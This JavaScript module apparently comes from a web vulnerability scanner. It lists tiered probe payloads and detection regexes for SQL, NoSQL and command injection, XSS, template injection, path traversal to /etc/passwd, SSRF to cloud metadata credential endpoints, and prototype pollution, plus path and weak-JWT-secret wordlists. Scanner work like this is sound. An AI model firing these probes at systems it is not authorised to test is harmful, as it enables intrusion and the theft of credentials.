/**
 * 检测 payload 与特征签名集合（分级：rookie 保守 / veteran 激进）。
 *
 * 设计原则：
 * - rookie 只放**低噪声、无副作用**的探测串；veteran 才追加时间盲注、编码变体等激进项；
 * - 每个 payload 都是"探测"，不包含写入、删除、反弹 shell、反序列化利用链；
 * - 时间型 payload 统一 ≤2 秒，远低于契约允许的 5 秒上限；
 * - 所有列表顺序固定，保证同一输入得到同一测试顺序。
 *
 * 使用方式：`forMode(PROBES, ctx.mode)` 取当前模式可用列表（veteran 列表是超集）。
 *
 * @module dsh-daiyi-aimy-skill/lib/engine/payloads
 */

/** 无害回显 marker（用于反射/渲染判定）。 */
export const MARKER = 'aimy1337'

/**
 * 按运行模式取 payload 列表。
 * @template T
 * @param {{ rookie: T[], veteran: T[] }} set
 * @param {'rookie' | 'veteran'} [mode]
 * @returns {T[]}
 */
export function forMode(set, mode) {
  if (!set || typeof set !== 'object') return []
  return mode === 'veteran' ? set.veteran : set.rookie
}

// ---------------------------------------------------------------------------
// SQL 注入
// ---------------------------------------------------------------------------

/** 错误型探测串。 */
export const SQL_ERROR_QUERIES = {
  rookie: ["'", '"', "1'", "')"],
  veteran: ["'", '"', "1'", "')", "'))", "\\'", '`', "' OR '1'='1", "'; SELECT 1-- "],
}

/** 布尔型（真, 假）payload 对。 */
export const SQL_BOOLEAN_PAIRS = {
  rookie: [
    ["' AND '1'='1", "' AND '1'='2"],
    ['" AND "1"="1', '" AND "1"="2'],
  ],
  veteran: [
    ["' AND '1'='1", "' AND '1'='2"],
    ['" AND "1"="1', '" AND "1"="2'],
    ["1 AND 1=1", "1 AND 1=2"],
    ["') AND ('1'='1", "') AND ('1'='2"],
    ["' OR '1'='1' -- ", "' OR '1'='2' -- "],
  ],
}

/** 时间型探测（仅 veteran）��统一 ≤2s，需二次复现。 */
export const SQL_TIME_PROBES = {
  rookie: [],
  veteran: [
    { value: "' OR SLEEP(2)-- ", dialect: 'MySQL' },
    { value: "' WAITFOR DELAY '0:0:2'-- ", dialect: 'MSSQL' },
    { value: "'; WAITFOR DELAY '0:0:2'-- ", dialect: 'MSSQL' },
    { value: "' OR pg_sleep(2)-- ", dialect: 'PostgreSQL' },
    { value: "') OR pg_sleep(2)-- ", dialect: 'PostgreSQL' },
  ],
}

/**
 * 数据库错误特征。判定要求**至少命中 2 个不同签名**（见 CONTRACT 2.4 的保守原则）。
 * 每条正则都尽量锚定数据库专有措辞，避免宽泛的 "error" 造成误报。
 */
export const SQL_ERROR_SIGNATURES = [
  { id: 'mysql-syntax', db: 'MySQL', re: /SQL syntax[^\r\n]{0,60}MySQL/i },
  { id: 'mysql-warning', db: 'MySQL', re: /Warning[^\r\n]{0,40}mysql_[a-z_]+/i },
  { id: 'mysql-exception', db: 'MySQL', re: /MySQLSyntaxErrorException/i },
  { id: 'mysql-manual', db: 'MySQL', re: /check the manual that corresponds to your (?:MySQL|MariaDB) server/i },
  { id: 'mysql-column', db: 'MySQL', re: /Unknown column '[^']+' in 'field list'/i },
  { id: 'mssql-oledb', db: 'MSSQL', re: /Microsoft OLE DB[^\r\n]{0,60}SQL Server/i },
  { id: 'mssql-unclosed', db: 'MSSQL', re: /Unclosed quotation mark after the character string/i },
  { id: 'mssql-driver', db: 'MSSQL', re: /SQL Server[^\r\n]{0,40}Driver/i },
  { id: 'postgres-error', db: 'PostgreSQL', re: /PostgreSQL[^\r\n]{0,30}ERROR/i },
  { id: 'postgres-pg', db: 'PostgreSQL', re: /PG::SyntaxError/i },
  { id: 'oracle-ora', db: 'Oracle', re: /ORA-\d{5}/i },
  { id: 'sqlite-exception', db: 'SQLite', re: /SQLite3::SQLException|SQLite\.Exception|System\.Data\.SQLite/i },
  { id: 'unterminated-string', db: 'Generic', re: /Unterminated string literal|quoted string not properly terminated/i },
]

// ---------------------------------------------------------------------------
// XSS（反射型）
// ---------------------------------------------------------------------------

/** 各上下文使用的探测串；marker 会被前缀拼接，避免把自然出现的 49/alert 当命中。 */
export const XSS_PAYLOADS = {
  html: {
    rookie: [`<img src=x onerror=${MARKER}>`, `<svg onload=${MARKER}>`],
    veteran: [
      `<img src=x onerror=${MARKER}>`,
      `<svg onload=${MARKER}>`,
      `<script>${MARKER}</script>`,
      `<details open ontoggle=${MARKER}>`,
      `<input autofocus onfocus=${MARKER}>`,
    ],
  },
  attr: {
    rookie: [`" onfocus=${MARKER} autofocus="`, `' onfocus=${MARKER} autofocus='`],
    veteran: [
      `" onfocus=${MARKER} autofocus="`,
      `' onfocus=${MARKER} autofocus='`,
      `" autofocus onfocus=${MARKER}`,
      `' autofocus onfocus=${MARKER}`,
      `" onmouseover=${MARKER} "`,
    ],
  },
  js: {
    rookie: [`';${MARKER}//`, `";${MARKER}//`],
    veteran: [
      `';${MARKER}//`,
      `";${MARKER}//`,
      `</script><script>${MARKER}</script>`,
      `';${MARKER};'`,
      `";${MARKER};"`,
    ],
  },
}

/** 危险构造特征：只有 payload 以**未编码**形式出现时才计入。 */
export const XSS_DANGEROUS_SIGNATURES = [
  { id: 'script-tag', re: /<script[^>]*>/i },
  { id: 'event-handler', re: /\bon(?:error|load|focus|toggle|mouseover|animationstart)\s*=/i },
  { id: 'javascript-uri', re: /\bjavascript\s*:/i },
]

// ---------------------------------------------------------------------------
// 命令注入
// ---------------------------------------------------------------------------

/** 回显型探测串；命中后会用第二个不同操作符复测。 */
export const CMDI_ECHO_PROBES = {
  rookie: [
    { value: '; id', operator: ';' },
    { value: '| id', operator: '|' },
    { value: '$(id)', operator: '$()' },
    { value: '`id`', operator: '`' },
  ],
  veteran: [
    { value: '; id', operator: ';' },
    { value: '| id', operator: '|' },
    { value: '$(id)', operator: '$()' },
    { value: '`id`', operator: '`' },
    { value: '&& id', operator: '&&' },
    { value: '%0a id', operator: '换行' },
  ],
}

/** 强回显特征：未在基线出现时才计入。 */
export const CMDI_OUTPUT_SIGNATURES = [
  { id: 'uid-gid', re: /uid=\d+\([\w.-]+\)/i },
  { id: 'gid', re: /gid=\d+\([\w.-]+\)/i },
  { id: 'groups', re: /groups?=\d+\([\w.-]+\)/i },
  { id: 'passwd-root', re: /root:[^:\r\n]*:0:0:/i },
  { id: 'windows-version', re: /Microsoft Windows \[Version/i },
  { id: 'nt-authority', re: /NT AUTHORITY\\/i },
  { id: 'windows-volume', re: /Volume in drive [A-Z]:/i },
  { id: 'windows-dir', re: /Directory of [A-Z]:\\/i },
]

/** 弱回显特征：需要至少 2 个同时命中才计入。 */
export const CMDI_WEAK_SIGNATURES = [
  { id: 'command-not-found', re: /command not found/i },
  { id: 'not-recognized', re: /is not recognized as an internal or external command/i },
  { id: 'no-such-file', re: /No such file or directory/i },
  { id: 'ping-bytes', re: /\d+ bytes from /i },
]

/** 时间型探测（仅 veteran），需基线对比 + 二次复现。 */
export const CMDI_TIME_PROBES = {
  rookie: [],
  veteran: [
    { value: '; sleep 2', operator: ';' },
    { value: '| sleep 2', operator: '|' },
    { value: '& ping -n 3 127.0.0.1 &', operator: '&' },
  ],
}

// ---------------------------------------------------------------------------
// SSTI（服务端模板注入）
// ---------------------------------------------------------------------------

/**
 * 模板探测：把 marker 与表达式拼在一起，只有**服务端求值**才会输出
 * `${marker}49` 这类基线不会出现的字符串，比直接找 "49" 可靠得多。
 */
export const SSTI_PROBES = {
  rookie: [
    { prefix: MARKER, expression: '{{7*7}}', expected: `${MARKER}49`, engine: 'Jinja2/Twig/Nunjucks 系' },
    { prefix: MARKER, expression: "${7*7}", expected: `${MARKER}49`, engine: 'EL/Freemarker/Mako 系' },
  ],
  veteran: [
    { prefix: MARKER, expression: '{{7*7}}', expected: `${MARKER}49`, engine: 'Jinja2/Twig/Nunjucks 系' },
    { prefix: MARKER, expression: "${7*7}", expected: `${MARKER}49`, engine: 'EL/Freemarker/Mako 系' },
    { prefix: MARKER, expression: "{{7*'7'}}", expected: `${MARKER}7777777`, engine: 'Jinja2/Twig 系' },
    { prefix: MARKER, expression: '<%= 7*7 %>', expected: `${MARKER}49`, engine: 'EJS/ERB 系' },
    { prefix: MARKER, expression: '#{7*7}', expected: `${MARKER}49`, engine: 'Ruby/Thymeleaf 系' },
  ],
}

// ---------------------------------------------------------------------------
// LFI / 路径遍历
// ---------------------------------------------------------------------------

/** 路径遍历读取探测串（只读取特征文件，不写文件、不执行命令）。 */
export const LFI_TRAVERSAL_PAYLOADS = {
  rookie: [
    '../etc/passwd',
    '../../etc/passwd',
    '../../../etc/passwd',
    '..\\windows\\win.ini',
    '..\\..\\windows\\win.ini',
  ],
  veteran: [
    '../etc/passwd',
    '../../etc/passwd',
    '../../../etc/passwd',
    '../../../../etc/passwd',
    '../../../../../etc/passwd',
    '..\\windows\\win.ini',
    '..\\..\\windows\\win.ini',
    '..\\..\\..\\windows\\win.ini',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    '..%252f..%252f..%252fetc%252fpasswd',
    '....//....//....//etc/passwd',
    '/etc/passwd',
    '/etc/hostname',
  ],
}

/** PHP 包装器：base64 编码读取，只用于回显判断。 */
export const LFI_WRAPPER_PAYLOADS = {
  rookie: [],
  veteran: [
    { value: 'php://filter/convert.base64-encode/resource=/etc/passwd', family: 'php-filter' },
    { value: 'php://filter/convert.base64-encode/resource=index', family: 'php-filter' },
  ],
}

/** 文件内容特征（强特征，需基线中不存在）。 */
export const LFI_SIGNATURES = [
  { id: 'etc-passwd-root', file: '/etc/passwd', re: /root:[^:\r\n]*:0:0:/i },
  { id: 'etc-passwd-user', file: '/etc/passwd', re: /\b(?:daemon|nobody|www-data|bin):[^:\r\n]*:\d+:\d+:/i },
  { id: 'winini-fonts', file: 'win.ini', re: /\[fonts\]/i },
  { id: 'winini-extensions', file: 'win.ini', re: /\[extensions\]/i },
  { id: 'winini-16bit', file: 'win.ini', re: /for 16-bit app support/i },
  { id: 'hostname', file: '/etc/hostname', re: /^[a-z0-9][a-z0-9.-]{2,62}$/im },
]

// ---------------------------------------------------------------------------
// SSRF（仅回显判定，不做 OOB 回调）
// ---------------------------------------------------------------------------

/** 注入到参数里的内部 URL / 文件 URL；只访问目标自身会看到的位置。 */
export const SSRF_PROBES = {
  rookie: [
    'http://127.0.0.1:80/',
    'http://169.254.169.254/latest/meta-data/',
    'file:///etc/passwd',
  ],
  veteran: [
    'http://127.0.0.1:80/',
    'http://169.254.169.254/latest/meta-data/',
    'file:///etc/passwd',
    'http://169.254.169.254/latest/user-data/',
    'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    'http://metadata.google.internal/computeMetadata/v1/',
    'http://[::1]/',
    'http://localhost/',
    'file:///c:/windows/win.ini',
  ],
}

/** 强内容特征：出现即说明服务端取回了内部资源内容。 */
export const SSRF_EVIDENCE_SIGNATURES = [
  { id: 'etc-passwd', re: /root:[^:\r\n]*:0:0:/i },
  { id: 'aws-ami-id', re: /ami-id/i },
  { id: 'aws-instance-id', re: /instance-id/i },
  { id: 'aws-security-credentials', re: /security-credentials/i },
  { id: 'aws-access-key', re: /AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY/ },
  { id: 'gcp-metadata', re: /computeMetadata/i },
  { id: 'win-ini', re: /\[fonts\]|for 16-bit app support/i },
]

/** 服务端回连失败的错误回显（弱证据，需结合内部主机判断）。 */
export const SSRF_ERROR_SIGNATURES = [
  /Connection refused/i,
  /Failed to connect/i,
  /Could not resolve host/i,
  /Name or service not known/i,
  /connect ECONNREFUSED/i,
  /No route to host/i,
  /Network is unreachable/i,
]

// ---------------------------------------------------------------------------
// NoSQL 注入
// ---------------------------------------------------------------------------

export const NOSQLI_BOOLEAN_PAIRS = {
  rookie: [
    ["' || '1'=='1", "' || '1'=='2"],
    ['" || "1"=="1"', '" || "1"=="2"'],
    ["' || 1==1 //", "' || 1==2 //"],
  ],
  veteran: [
    ["' || '1'=='1", "' || '1'=='2"],
    ['" || "1"=="1"', '" || "1"=="2"'],
    ["' || 1==1 //", "' || 1==2 //"],
    ["'; return true; //", "'; return false; //"],
    ["admin' --", "admin' ##"],
  ],
}

/** MongoDB / BSON 专有错误特征（避免宽泛的 "Invalid JSON"）。 */
export const NOSQLI_ERROR_SIGNATURES = [
  { id: 'mongo-error', re: /MongoError/i },
  { id: 'mongo-server', re: /MongoDB server error/i },
  { id: 'bson-invalid', re: /Invalid BSON/i },
  { id: 'mongo-bad-value', re: /BadValue[^\r\n]{0,80}MongoDB/i },
  { id: 'mongo-cast', re: /CastError[^\r\n]{0,60}(?:ObjectId|Mongo)/i },
]

/** JSON 操作符注入（仅 veteran；只读查询，不写库）。 */
export const NOSQLI_JSON_PROBES = {
  rookie: [],
  veteran: [
    { id: '$ne-empty', value: { $ne: '' } },
    { id: '$gt-empty', value: { $gt: '' } },
    { id: '$regex-any', value: { $regex: '.*' } },
  ],
}

// ---------------------------------------------------------------------------
// GraphQL
// ---------------------------------------------------------------------------

/** 内省查询（只读）。 */
export const GRAPHQL_INTROSPECTION_QUERY =
  'query IntrospectionQuery { __schema { types { name kind fields { name } } } }'

/** 轻量查询：验证端点是否接受 GET 方式查询（配合 CSRF 风险判断）。 */
export const GRAPHQL_TYPENAME_QUERY = 'query { __typename }'

// ---------------------------------------------------------------------------
// 原型链污染（只观测响应差异，不投毒持久化）
// ---------------------------------------------------------------------------

/** 探测用的无副作用属性名。 */
export const PROTO_POLLUTION_MARKER = 'aimypp1337'

/** 查询串形式的探测表达式。rookie 只做一次最保守的 `__proto__` 键探测。 */
export const PROTO_POLLUTION_QUERY_PAYLOADS = {
  rookie: [`__proto__[${PROTO_POLLUTION_MARKER}]=1`],
  veteran: [
    `__proto__[${PROTO_POLLUTION_MARKER}]=1`,
    `constructor[prototype][${PROTO_POLLUTION_MARKER}]=1`,
  ],
}

/** JSON 形式的探测 body（只含 marker 属性，不覆盖已有业务字段）；仅 veteran 发送。 */
export const PROTO_POLLUTION_JSON_PAYLOADS = {
  rookie: [],
  veteran: [
    { id: '__proto__', body: { __proto__: { [PROTO_POLLUTION_MARKER]: '1' } } },
    { id: 'constructor-prototype', body: { constructor: { prototype: { [PROTO_POLLUTION_MARKER]: '1' } } } },
  ],
}

// ---------------------------------------------------------------------------
// 目录/路径爆破
// ---------------------------------------------------------------------------

/** 字典。rookie 只放高价值、低噪声路径；veteran 扩充常见备份/配置/管理路径。 */
export const DIR_WORDLIST = {
  rookie: [
    'robots.txt',
    'sitemap.xml',
    '.well-known/security.txt',
    'admin',
    'login',
    'api',
    'config',
    '.env',
    '.git/HEAD',
    'backup',
  ],
  veteran: [
    'robots.txt',
    'sitemap.xml',
    '.well-known/security.txt',
    'admin',
    'login',
    'api',
    'config',
    '.env',
    '.git/HEAD',
    'backup',
    'wp-admin',
    'wp-login.php',
    'phpinfo.php',
    'server-status',
    'actuator',
    'actuator/health',
    'swagger-ui.html',
    'openapi.json',
    'graphql',
    'console',
    'debug',
    'test',
    'dev',
    'old',
    'backup.zip',
    'backup.tar.gz',
    'database.sql',
    'config.php.bak',
    '.htaccess',
    '.DS_Store',
    'web.config',
    'crossdomain.xml',
  ],
}

/** 敏感路径 → 严重级别建议。 */
export const DIR_SENSITIVE_PATHS = [
  { match: /(^|\/)\.env$/i, severity: 'high', label: '环境变量文件' },
  { match: /(^|\/)\.git\//i, severity: 'high', label: 'Git 仓库元数据' },
  { match: /(^|\/)(?:backup|database).*\.(?:zip|tar\.gz|sql|bak)$/i, severity: 'high', label: '备份/数据库文件' },
  { match: /(^|\/)config\.php\.bak$/i, severity: 'high', label: '配置备份' },
  { match: /(^|\/)(?:phpinfo|server-status|actuator)/i, severity: 'medium', label: '调试/管理端点' },
  { match: /(^|\/)(?:admin|login|console|debug|test|dev|old)(\/|$)/i, severity: 'low', label: '管理/调试入口' },
  { match: /(^|\/)wp-(?:admin|login)/i, severity: 'low', label: 'WordPress 入口' },
]

// ---------------------------------------------------------------------------
// 参数挖掘
// ---------------------------------------------------------------------------

/** 常见查询参数名候选（顺序固定）。 */
export const COMMON_GET_PARAMS = [
  'id', 'page', 'file', 'url', 'cmd', 'q', 'search', 'name', 'user',
  'type', 'category', 'sort', 'order', 'limit', 'offset', 'filter',
  'action', 'method', 'token', 'lang', 'locale', 'debug', 'test',
  'template', 'view', 'include', 'path', 'dir', 'download', 'read',
  'show', 'edit', 'delete', 'do', 'exec', 'run', 'pid', 'uid',
  'gid', 'role', 'admin', 'config', 'setting', 'mode', 'tab',
  'section', 'step', 'state', 'status', 'format', 'output', 'callback',
  'redirect', 'next', 'return', 'referer', 'source', 'target',
]

/** 常见表单参数名候选（顺序固定）。 */
export const COMMON_POST_PARAMS = [
  'username', 'password', 'pass', 'email', 'user', 'login',
  'token', 'csrf', 'csrf_token', '_token', 'authenticity_token',
  'name', 'first_name', 'last_name', 'phone', 'address',
  'message', 'comment', 'content', 'title', 'description',
  'command', 'cmd', 'code', 'data',
  'file', 'image', 'document', 'attachment', 'id', 'type',
  'category', 'status', 'role', 'permission', 'setting',
  'config', 'option', 'value', 'key', 'api_key', 'secret',
]

// ---------------------------------------------------------------------------
// JWT（静态分析用）
// ---------------------------------------------------------------------------

/** 弱 HMAC 密钥字典；只用于离线校验签名，不伪造令牌。 */
export const JWT_WEAK_SECRETS = {
  rookie: ['secret', 'password', '123456', 'admin', 'key', 'jwt_secret', 'supersecret', 'changeme'],
  veteran: [
    'secret', 'password', '123456', 'admin', 'key', 'jwt_secret', 'supersecret', 'changeme',
    'secretkey', 'secret_key', 'jwt', 'token', 'test', 'dev', 'development',
    'production', 'private', 'public', 'HS256', 'sha256', 'mysecret',
    'your-256-bit-secret', 's3cr3t', 'passw0rd', 'P@ssw0rd', '12345678',
    '123456789', 'qwerty', 'letmein', 'welcome', 'root', 'administrator',
    'api_secret', 'app_secret', 'auth', 'jwtkey', 'jwt-key', 'signing_key',
  ],
}

/** 单个令牌最多尝试的字典条数（控制离线 CPU 时间）。 */
export const JWT_SECRET_BUDGET = { rookie: 8, veteran: 40 }

// ---------------------------------------------------------------------------
// 统一索引（供工具层/引擎按 checkId 选择 payload）
// ---------------------------------------------------------------------------

/**
 * 按 checkId 分组的 payload 集合。
 * 每项要么是普通数组，要么是 `{ rookie, veteran }` 分级对象。
 */
export const PAYLOADS = {
  'sqli-error': SQL_ERROR_QUERIES,
  'sqli-boolean': SQL_BOOLEAN_PAIRS,
  'sqli-time': SQL_TIME_PROBES,
  'xss-html': XSS_PAYLOADS.html,
  'xss-attr': XSS_PAYLOADS.attr,
  'xss-js': XSS_PAYLOADS.js,
  'cmdi-echo': CMDI_ECHO_PROBES,
  'cmdi-time': CMDI_TIME_PROBES,
  ssti: SSTI_PROBES,
  'lfi-traversal': LFI_TRAVERSAL_PAYLOADS,
  'lfi-wrapper': LFI_WRAPPER_PAYLOADS,
  ssrf: SSRF_PROBES,
  'nosqli-boolean': NOSQLI_BOOLEAN_PAIRS,
  'nosqli-json': NOSQLI_JSON_PROBES,
  'proto-pollution-query': PROTO_POLLUTION_QUERY_PAYLOADS,
  'proto-pollution-json': PROTO_POLLUTION_JSON_PAYLOADS,
  'dir-brute': DIR_WORDLIST,
  'jwt-weak-secret': JWT_WEAK_SECRETS,
}

/**
 * 按 checkId + 运行模式取 payload 列表。
 * 未知 checkId 返回空数组；分级对象自动回落到 rookie。
 * @param {string} checkId
 * @param {'rookie' | 'veteran'} [mode]
 * @returns {Array<any>}
 */
export function getPayloads(checkId, mode) {
  const set = PAYLOADS[checkId]
  if (set === undefined || set === null) return []
  if (Array.isArray(set)) return set.slice()
  if (typeof set === 'object') {
    const chosen = mode === 'veteran' ? set.veteran : set.rookie
    return Array.isArray(chosen) ? chosen.slice() : []
  }
  return []
}
